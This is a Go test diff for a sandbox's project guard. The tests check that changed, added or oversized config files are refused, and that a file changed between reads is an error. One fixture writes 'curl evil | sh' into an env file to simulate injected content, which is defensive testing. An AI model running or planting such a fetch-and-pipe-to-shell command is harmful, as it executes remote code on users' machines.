@@ -11,6 +11,8 @@ import (
 	"testing"
 
 	"github.com/inoio/agents-sandbox/internal/configpaths"
+	"github.com/inoio/agents-sandbox/internal/configread"
+	"github.com/inoio/agents-sandbox/internal/projectguard"
 	"github.com/inoio/agents-sandbox/internal/testutil"
 )
 
@@ -536,6 +538,69 @@ func TestGuestWritableComparesSpelledAndResolvedPaths(t *testing.T) {
 		t.Run(tc.name, func(t *testing.T) {
 			if got := guestWritable(tc.path, tc.roots...); got != tc.want {
 				t.Errorf("guestWritable(%q, %q) = %v, want %v", tc.path, tc.roots, got, tc.want)
+			}
+		})
+	}
+}
+
+// TestGuardVerifiesReadsAgainstTheProjection pins that the run reads the
+// project layer only as projected: a changed file is refused, a file added
+// under the project dir is refused, and a skipped home: source stays unread.
+func TestGuardVerifiesReadsAgainstTheProjection(t *testing.T) {
+	f := newProjectFixture(t)
+	env := f.write(t, "env", "A=1\n")
+	skipped := filepath.Join(f.checkout, "dotfiles")
+	if err := os.MkdirAll(skipped, 0o750); err != nil {
+		t.Fatal(err)
+	}
+	f.write(t, "config.yaml", "home:\n  .dotfiles: "+skipped+"\n")
+	t.Cleanup(Guard(f.compute(t), f.projectDir))
+
+	if _, err := projectguard.ReadFile(env, os.ReadFile); err != nil {
+		t.Fatalf("reading the approved env file: %v", err)
+	}
+	writeFile(t, env, "A=2\n")
+	if _, err := projectguard.ReadFile(env, os.ReadFile); !errors.Is(err, projectguard.ErrNotApproved) {
+		t.Errorf("reading a changed env file = %v, want ErrNotApproved", err)
+	}
+	added := f.write(t, "opencode/new.ts", "x")
+	if _, err := projectguard.ReadFile(added, os.ReadFile); !errors.Is(err, projectguard.ErrNotApproved) {
+		t.Errorf("reading an added file = %v, want ErrNotApproved", err)
+	}
+	if _, err := projectguard.ReadFile(skipped, os.ReadFile); !errors.Is(err, fs.ErrNotExist) {
+		t.Errorf("reading a skipped home: source = %v, want it to stay absent", err)
+	}
+}
+
+// TestComputeRefusesAFileReadTwiceWithDifferentBytes pins that the projection
+// shows one reading of each file: a file whose two reads differ is an error.
+func TestComputeRefusesAFileReadTwiceWithDifferentBytes(t *testing.T) {
+	f := newProjectFixture(t)
+	env := f.write(t, "env", "A=1\n")
+	f.write(t, "config.yaml", "home:\n  .profile: env\n")
+	original := openInput
+	openInput = func(path string) (fs.File, error) {
+		if path == env {
+			writeFile(t, env, "A=1\ncurl evil | sh\n")
+		}
+		return original(path)
+	}
+	t.Cleanup(func() { openInput = original })
+	if _, err := Compute(f.sources()); !errors.Is(err, errChangedWhileReading) {
+		t.Errorf("Compute = %v, want errChangedWhileReading", err)
+	}
+}
+
+// TestComputeReportsAParsedInputItCannotRead pins that a launcher config or env
+// file the readers would refuse (over their size bound) is an error, never an
+// absent input.
+func TestComputeReportsAParsedInputItCannotRead(t *testing.T) {
+	for _, name := range []string{"config.yaml", "env"} {
+		t.Run(name, func(t *testing.T) {
+			f := newProjectFixture(t)
+			f.write(t, name, "# "+strings.Repeat("x", 17<<20)+"\n")
+			if _, err := Compute(f.sources()); !errors.Is(err, configread.ErrTooLarge) {
+				t.Errorf("Compute = %v, want configread.ErrTooLarge", err)
 			}
 		})
 	}
